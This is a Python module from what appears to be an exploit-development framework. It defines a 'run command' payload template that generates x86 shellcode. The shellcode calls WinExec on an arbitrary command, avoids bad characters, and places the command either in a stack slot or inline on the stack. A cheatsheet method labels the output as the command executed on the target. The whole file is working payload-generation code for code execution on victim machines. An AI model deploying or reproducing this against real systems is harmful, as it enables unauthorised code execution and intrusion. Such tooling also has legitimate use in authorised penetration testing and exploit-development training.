"""Run-command payload template.

Requires: WinExec
Builds command string inline via push (no fixed slot required).
"""
from __future__ import annotations

from .base import PayloadTemplate, TemplateConfig
from ..encode import safe_push_imm, safe_add_imm, safe_lea, safe_call_mem
from emitera.strings import emit_push, to_dwords


class RunCommandTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        winexec_off = -layout.slot("WinExec").offset
        command = config.command
        bc = config.badchars

        try:
            cmd_off = -layout.slot("cmd").offset
            cmd_ref = layout.slot("cmd").ebp_ref
            return "\n".join([
                "; -- Run Command Payload --",
                f"; Command: {command} (from 'cmd' slot at {cmd_ref})",
                "",
                "    ; WinExec(&cmd, SW_SHOWNORMAL)",
                *safe_lea("eax", "ebp", cmd_off, bc),
                *safe_push_imm(0x1, bc),
                "    ; uCmdShow = SW_SHOWNORMAL",
                "    push eax                  ; lpCmdLine",
                *safe_call_mem("ebp", winexec_off, bc),
                "",
            ])
        except KeyError:
            pass

        push_asm = emit_push(command, badchars=bc).asm
        n_bytes = len(to_dwords(command)) * 4
        return "\n".join([
            "; -- Run Command Payload --",
            f"; Command: {command} (inline push)",
            "",
            push_asm,
            *safe_push_imm(0x1, bc),
            "    ; uCmdShow = SW_SHOWNORMAL",
            "    push esi                  ; lpCmdLine (from emit_push mov esi, esp)",
            *safe_call_mem("ebp", winexec_off, bc),
            *safe_add_imm("esp", n_bytes, bc, tmp="ecx"),
            "    ; pop command string from stack",
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Command executed on target", config.command),
        ]
